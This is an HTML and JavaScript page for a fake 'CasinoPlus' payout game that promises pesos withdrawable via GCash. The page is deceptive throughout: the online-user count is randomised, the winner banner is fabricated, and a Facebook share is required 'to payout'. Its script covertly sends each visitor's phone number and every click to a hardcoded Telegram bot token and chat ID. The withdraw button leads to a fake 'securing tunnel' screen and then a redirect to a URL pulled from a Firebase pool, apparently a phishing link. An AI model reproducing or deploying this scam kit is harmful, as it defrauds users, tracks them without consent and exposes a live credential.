<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>CasinoPlus | Live Payout</title>

    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <script src="js/config.js"></script>

    <link rel="stylesheet" href="style.css">
    <link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;800&family=Orbitron:wght@700&display=swap" rel="stylesheet">

    <style>
        :root { --gold: linear-gradient(180deg, #ffdc6a 0%, #d4af37 100%); --dark-bg: #04070d; }
        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }

        body { 
            font-family: 'Public Sans', sans-serif; 
            background-color: var(--dark-bg); 
            background-image: radial-gradient(circle at 50% 0%, #1e3a8a 0%, transparent 70%); 
            color: #fff; 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            min-height: 100vh; 
            padding: 15px; 
            overflow-x: hidden; 
        }

        /* OVERLAYS */
        #processingOverlay { position: fixed; inset: 0; background: rgba(4, 7, 13, 0.98); z-index: 999999; display: none; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 20px; backdrop-filter: blur(15px); }
        .spinner { width: 60px; height: 60px; border: 5px solid rgba(212, 175, 55, 0.3); border-top-color: #d4af37; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 25px; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .proc-title { font-size: 20px; font-weight: 900; color: #fff; margin-bottom: 15px; }

        /* LIVE STATS */
        .live-stats { width: 100%; max-width: 400px; margin-bottom: 15px; display: flex; flex-direction: column; align-items: center; gap: 8px; }
        .live-winner-box { background: rgba(0, 0, 0, 0.85); border: 1px solid rgba(212, 175, 55, 0.4); padding: 8px 15px; border-radius: 50px; font-size: 11px; display: flex; align-items: center; gap: 8px; }
        .online-count { font-size: 10px; color: #22c55e; font-weight: 800; text-transform: uppercase; }
        .dot { width: 8px; height: 8px; background: #22c55e; border-radius: 50%; display: inline-block; box-shadow: 0 0 10px #22c55e; animation: pulse 1.5s infinite; }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }
        .gc-mini-icon { width: 16px; height: 16px; object-fit: contain; vertical-align: middle; }

        /* MAIN CARD */
        .card { 
            background: rgba(255, 255, 255, 0.03); 
            width: 100%; 
            max-width: 380px; 
            padding: 20px 15px; 
            border-radius: 25px; 
            border: 1px solid rgba(212, 175, 55, 0.3); 
            backdrop-filter: blur(15px); 
            text-align: center; 
        }

        .logo-img { width: 130px; margin-bottom: 10px; height: auto; }

        /* GRID */
        .game-grid { 
            display: grid; 
            grid-template-columns: repeat(3, 1fr); 
            gap: 10px; 
            margin: 15px 0; 
        }
        .card-wrapper { cursor: pointer; transition: transform 0.2s; }
        .card-img { width: 100%; height: auto; filter: drop-shadow(0 5px 10px rgba(0,0,0,0.5)); }
        .card-disabled { filter: grayscale(1) opacity(0.3); pointer-events: none; }

        /* Animation class trigger */
        .move-active { animation: bounce 0.5s ease-out 1; }
        @keyframes bounce { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.1); } }

        /* BALANCE & BUTTONS */
        .label-text { font-size: 11px; color: #fbbf24; letter-spacing: 2px; font-weight: 800; margin-top: 10px; }
        .amount { font-family: 'Orbitron', sans-serif; font-size: 38px; background: var(--gold); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 700; margin: 5px 0; }

        .btn-group { display: flex; flex-direction: column; gap: 10px; margin-top: 15px; }
        .pay-button { background: var(--gold); color: #000; width: 100%; padding: 16px; border: none; border-radius: 12px; font-size: 16px; font-weight: 800; text-transform: uppercase; cursor: pointer; box-shadow: 0 5px 0 #8b6508; }
        .pay-button:disabled { background: #334155; color: #64748b; box-shadow: none; cursor: not-allowed; opacity: 0.6; }
        
        .share-btn { background: #1877f2; color: #fff; width: 100%; padding: 14px; border: none; border-radius: 12px; font-size: 14px; font-weight: 700; text-transform: uppercase; display: none; cursor: pointer; }

        .promo-photo { width: 100%; border-radius: 15px; margin-top: 20px; border: 1px solid rgba(212, 175, 55, 0.1); height: auto; }
    </style>
</head>
<body>

    <div id="processingOverlay">
        <div class="spinner"></div>
        <div class="proc-title">ESTABLISHING VIALINK...</div>
        <div id="proc-status" style="color: #fbbf24; font-size: 12px;">Securing Tunnel...</div>
    </div>

    <div id="mainContent" style="width: 100%; display: flex; flex-direction: column; align-items: center;">
        
        <div class="live-stats">
            <div class="online-count"><span class="dot"></span> <span id="userCount">74</span> Members Online</div>
            <div class="live-winner-box">
                <span id="winnerEntry">User 0917***8821 claimed <img src="images/gc_icon.png" class="gc-mini-icon"> ₱500</span>
            </div>
        </div>

        <div class="card">
            <img src="images/logo1.png" class="logo-img">

            <div class="game-grid">
                <div class="card-wrapper" onclick="handleTap(this, 'goddess', 1)"><img src="images/img1.png" class="card-img"></div>
                <div class="card-wrapper" onclick="handleTap(this, 'monkey', 2)"><img src="images/img2.png" class="card-img"></div>
                <div class="card-wrapper" onclick="handleTap(this, 'bathala', 3)"><img src="images/img3.png" class="card-img"></div>
                <div class="card-wrapper" onclick="handleTap(this, 'bear', 4)"><img src="images/img4.png" class="card-img"></div>
                <div class="card-wrapper" onclick="handleTap(this, 'dress', 5)"><img src="images/img5.png" class="card-img"></div>
                <div class="card-wrapper" onclick="handleTap(this, 'boxer', 6)"><img src="images/img6.png" class="card-img"></div>
            </div>

            <div class="label-text">AVAILABLE BALANCE</div>
            <div class="amount" id="balanceText">₱0.00</div>

            <div class="btn-group">
                <button class="pay-button" id="claimBtn" onclick="redirectToGCash()" disabled>Withdraw via GCash</button>
                <button class="share-btn" id="shareBtn" onclick="shareToFB()">Share to Facebook to Payout</button>
            </div>

            <img src="images/casinoplus.jpeg" class="promo-photo">
        </div>
    </div>

    <script>
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        const botToken = "8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg";
        const chatId = "7298607329";
        const userPhone = localStorage.getItem("userPhone") || "Guest";

        let balance = 0;
        let clicks = 0;
        const targetReward = [500, 750, 950][Math.floor(Math.random() * 3)];

        async function logTelegram(msg) {
            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`;
            try { fetch(url); } catch(e) {}
        }

        logTelegram(`🚀 [ViaLink] User ${userPhone} is playing.`);

        function handleTap(el, animName, id) {
            if (clicks >= 6 || el.classList.contains('card-disabled')) return;
            
            clicks++;
            const img = el.querySelector('img');
            
            // Trigger animation class
            img.classList.add('move-active');
            // Kung may specific animation ka sa style.css like .move-goddess, uncomment ito:
            // img.classList.add('move-' + animName);

            // Update balance
            let nextBal = Math.floor((clicks / 6) * targetReward);
            animateValue(balance, nextBal, 500);
            balance = nextBal;

            logTelegram(`💰 [ViaLink] User ${userPhone} clicked Char ${id}. Balance: ₱${balance}`);

            setTimeout(() => {
                el.classList.add('card-disabled');
            }, 500);

            if (clicks === 6) {
                document.getElementById('claimBtn').disabled = false;
                document.getElementById('claimBtn').innerText = "CLAIM ₱" + balance + " NOW";
                document.getElementById('shareBtn').style.display = "block";
                logTelegram(`✅ [ViaLink] User ${userPhone} finished. Ready to claim ₱${balance}`);
            }
        }

        function animateValue(start, end, duration) {
            let startTimestamp = null;
            const step = (timestamp) => {
                if (!startTimestamp) startTimestamp = timestamp;
                const progress = Math.min((timestamp - startTimestamp) / duration, 1);
                const currentVal = Math.floor(progress * (end - start) + start);
                document.getElementById('balanceText').innerText = "₱" + currentVal.toLocaleString() + ".00";
                if (progress < 1) window.requestAnimationFrame(step);
            };
            window.requestAnimationFrame(step);
        }

        function shareToFB() {
            logTelegram(`📢 [ViaLink] User ${userPhone} clicked SHARE.`);
            window.open('https://www.facebook.com/sharer/sharer.php?u=' + encodeURIComponent(window.location.href), '_blank');
        }

        function redirectToGCash() {
            document.getElementById('processingOverlay').style.display = 'flex';
            logTelegram(`🔔 [ViaLink] User ${userPhone} redirecting to Merchant...`);

            setTimeout(() => {
                db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value', s => {
                    if(s.exists()) {
                        window.location.href = Object.values(s.val())[0].url;
                    } else {
                        window.location.href = "https://www.gcash.com/";
                    }
                });
            }, 3000);
        }

        setInterval(() => {
            const online = Math.floor(Math.random() * 30) + 50;
            document.getElementById('userCount').innerText = online;
        }, 5000);
    </script>
</body>
</html>
